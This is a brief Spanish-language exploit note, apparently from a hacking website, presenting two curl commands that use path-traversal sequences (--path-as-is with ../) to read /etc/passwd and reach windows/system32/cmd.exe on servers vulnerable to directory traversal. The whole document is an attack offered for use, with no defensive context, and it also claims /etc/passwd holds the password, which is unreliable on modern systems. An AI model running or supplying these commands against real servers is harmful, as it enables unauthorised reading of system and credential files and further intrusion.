# directoriotrasversal
#
# Exploits para extraer por http la password en la carperta Linux /etc/passwd, en paginas vulnerables a directorio traversal.
#

curl --path-as-is -k -v http://ip:80/../../../../../etc/passwd

curl --path-as-is -k -v http://ip:80/../../../../../../windows/system32/cmd.exe

www.hackingyseguridad.com

Codigos de respuesta HTTP https://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html
